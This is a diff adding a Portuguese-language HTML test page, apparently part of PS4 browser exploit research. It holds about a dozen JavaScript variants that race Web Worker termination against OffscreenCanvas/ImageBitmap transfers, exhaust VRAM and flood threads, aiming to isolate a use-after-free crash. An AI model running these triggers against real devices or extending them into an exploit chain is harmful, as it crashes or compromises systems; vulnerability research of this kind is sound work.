@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>PS4 Exploit - Root Cause Isolation Suite</title>
+    
+</head>
+<body>
+
+    <h1>[+] OffscreenCanvas UAF Isolation Suite</h1>
+    <p>Execute um teste por vez. Se o console nao reiniciar apos o aviso de "Finalizado", o teste <strong>FALHOU</strong> em reproduzir o bug.</p>
+
+    <button onclick="runOriginalTest()">[0] CONTROLE: Teste Original (Crash Confirmado)</button>
+    <button onclick="runTestA_NoTerminate()">[A] Variavel: SEM w.terminate() (Testa OOM vs UAF)</button>
+    <button onclick="runTestB_NoImageBitmap()">[B] Variavel: SEM ImageBitmap (Canvas Cru)</button>
+    <button onclick="runTestC_NoTransferList()">[C] Variavel: SEM Transfer List (Clone IPC em vez de Detach)</button>
+    <button onclick="runTestD_SilentWorker()">[D] Variavel: Worker Silencioso (Sem postMessage de retorno)</button>
+    
+    <h2>[E] Estabilizacao de Timing (Fuzzer Fixo)</h2>
+    <button onclick="runTestE_FixedTiming(5)">[E1] w.terminate() fixo em 5ms</button>
+    <button onclick="runTestE_FixedTiming(10)">[E2] w.terminate() fixo em 10ms</button>
+    <button onclick="runTestE_FixedTiming(15)">[E3] w.terminate() fixo em 15ms</button>
+
+    <button onclick="runTestF_SingleWorker()">[F] Worker Unico + Flood IPC (Testa roteamento de VRAM)</button>
+    <button onclick="runTestG_VRAMExhaustion()">[G] Exaustao de VRAM Pura (Sem Workers/IPC)</button>
+    <button onclick="runTestH_SlowDrip()">[H] Slow Drip 50ms (Descobre o numero exato para o crash)</button>
+    <button onclick="runTestI_ImmediateTeardown()">[I] Teardown Imediato (Colisao sincrona no mesmo frame)</button>
+    <button onclick="runTestJ_ThreadFlood()">[J] Pthread Flood Pura (Sem manipular Canvas/VRAM)</button>
+
+    <br><br>
+    <button class="stop-btn" onclick="stopAll()">[ PARAR EXECUCAO ATUAL ]</button>
+
+    <div id="log-container"></div>
+
+    <script>
+        let currentInterval = null;
+
+        function log(msg) {
+            const el = document.getElementById('log-container');
+            const time = new Date().toLocaleTimeString('pt-BR', { hour12: false, fractionalSecondDigits: 3 });
+            el.innerHTML += `<div class="log-entry">[${time}] ${msg}</div>`;
+            el.scrollTop = el.scrollHeight; // Auto-scroll
+        }
+
+        function stopAll() {
+            if (currentInterval) {
+                clearInterval(currentInterval);
+                currentInterval = null;
+                log("[-] Execução interrompida manualmente.");
+            }
+        }
+
+        // --- [0] Teste Original ---
+        function runOriginalTest() {
+            stopAll();
+            log("[*] Iniciando Teste Original (Controle)...");
+            const workerCode = `onmessage = (e) => { if (e.data && e.data.canvas) postMessage({ack: true}, [e.data.canvas]); };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Original - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste Original Finalizado (Sem Crash)."); }
+            }, 13);
+        }
+
+        // --- [A] Sem w.terminate() ---
+        function runTestA_NoTerminate() {
+            stopAll();
+            log("[*] Iniciando Teste A (Sem terminate)...");
+            const workerCode = `onmessage = (e) => { if (e.data.canvas) postMessage({ack: true}, [e.data.canvas]); };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                // Sem w.terminate()
+                
+                count++;
+                if (count % 65 === 0) log(`Teste A - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste A Finalizado (Sem Crash)."); }
+            }, 13);
+        }
+
+        // --- [B] Sem ImageBitmap ---
+        function runTestB_NoImageBitmap() {
+            stopAll();
+            log("[*] Iniciando Teste B (Canvas Cru)...");
+            const workerCode = `onmessage = (e) => { if (e.data.canvas) postMessage({ack: true}, [e.data.canvas]); };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                
+                try { w.postMessage({canvas: canvas}, [canvas]); } catch(e) {}
+                
+                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste B - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste B Finalizado (Sem Crash)."); }
+            }, 13);
+        }
+
+        // --- [C] Sem Transfer List ---
+        function runTestC_NoTransferList() {
+            stopAll();
+            log("[*] Iniciando Teste C (Clone IPC Sem Detach)...");
+            const workerCode = `onmessage = (e) => { /* Recebe clone */ };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                // Sem array de transferência
+                try { w.postMessage({canvas: transferred}); } catch(e) {}
+                
+                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste C - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste C Finalizado (Sem Crash)."); }
+            }, 13);
+        }
+
+        // --- [D] Worker Silencioso ---
+        function runTestD_SilentWorker() {
+            stopAll();
+            log("[*] Iniciando Teste D (Worker Silencioso)...");
+            const workerCode = `onmessage = (e) => { let sink = e.data; };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste D - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste D Finalizado (Sem Crash)."); }
+            }, 13);
+        }
+
+        // --- [E] Timing Fixo ---
+        function runTestE_FixedTiming(ms) {
+            stopAll();
+            log(`[*] Iniciando Teste E (Timing Fixo em ${ms}ms)...`);
+            const workerCode = `onmessage = (e) => { if (e.data.canvas) postMessage({ack: true}, [e.data.canvas]); };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                setTimeout(() => { w.terminate(); }, ms);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste E (${ms}ms) - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log(`[+] Teste E (${ms}ms) Finalizado (Sem Crash).`); }
+            }, 13);
+        }
+// --- [F] Worker Único ---
+        function runTestF_SingleWorker() {
+            stopAll();
+            log("[*] Iniciando Teste F: Worker Único + Flood IPC...");
+            const workerCode = `onmessage = (e) => { if (e.data.canvas) postMessage({ack: true}, [e.data.canvas]); };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            const w = new Worker(url);
+            let count = 0;
+            
+            currentInterval = setInterval(() => {
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                count++;
+                if (count % 65 === 0) log(`Flood IPC (Worker único): ${count}`);
+                if (count > 800) { 
+                    clearInterval(currentInterval); 
+                    w.terminate(); 
+                    log("[+] Teste F finalizado."); 
+                }
+            }, 13);
+        }
+
+        // --- [G] Exaustão de VRAM Pura ---
+        let memoryHog = []; // Variável global para segurar a memória
+        function runTestG_VRAMExhaustion() {
+            stopAll();
+            memoryHog = []; // Limpa lixo anterior
+            log("[*] Iniciando Teste G: Exaustão de VRAM Pura (Sem Workers)...");
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                memoryHog.push(transferred); // Prende na RAM/VRAM
+                
+                count++;
+                if (count % 65 === 0) log(`Texturas presas na VRAM: ${count}`);
+                if (count > 800) { 
+                    clearInterval(currentInterval); 
+                    memoryHog = []; // Liberta para o GC
+                    log("[+] Teste G finalizado."); 
+                }
+            }, 13);
+        }
+
+        // --- [H] Slow Drip ---
+        function runTestH_SlowDrip() {
+            stopAll();
+            isRunningH = true;
+            log("[*] Iniciando Teste H: Slow Drip (50ms) - Fique de olho no último número!");
+            const workerCode = `onmessage = (e) => { if (e.data.canvas) postMessage({ack: true}, [e.data.canvas]); };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            
+            function step() {
+                if (!isRunningH) return; // Interrompido pelo botão Parar
+                if (count > 800) { isRunningH = false; return log("[+] Teste H finalizado."); }
+                
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                
+                count++;
+                // Logamos com muito mais frequência para apanhar o momento exato do congelamento
+                if (count % 10 === 0) log(`Iteração lenta: ${count}`); 
+                
+                setTimeout(step, 50); // Pausa de 50ms para a UI atualizar
+            }
+            step();
+        }
+
+        // --- [I] Teardown Imediato ---
+        function runTestI_ImmediateTeardown() {
+            stopAll();
+            log("[*] Iniciando Teste I: Colisão Síncrona Imediata...");
+            const workerCode = `onmessage = (e) => { /* vazio */ };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                w.terminate(); // Morte instantânea
+                
+                count++;
+                if (count % 65 === 0) log(`Colisões imediatas: ${count}`);
+                if (count > 800) { clearInterval(currentInterval); log("[+] Teste I finalizado."); }
+            }, 13);
+        }
+
+        // --- [J] Pthread Flood ---
+        function runTestJ_ThreadFlood() {
+            stopAll();
+            log("[*] Iniciando Teste J: Pthread Flood Pura (Sem VRAM)...");
+            const workerCode = `onmessage = () => {};`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                w.postMessage("ping"); // Sem OffscreenCanvas
+                
+                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Threads mortas aleatoriamente: ${count}`);
+                if (count > 800) { clearInterval(currentInterval); log("[+] Teste J finalizado."); }
+            }, 13);
+        }
+    </script>
+</body>
+</html>
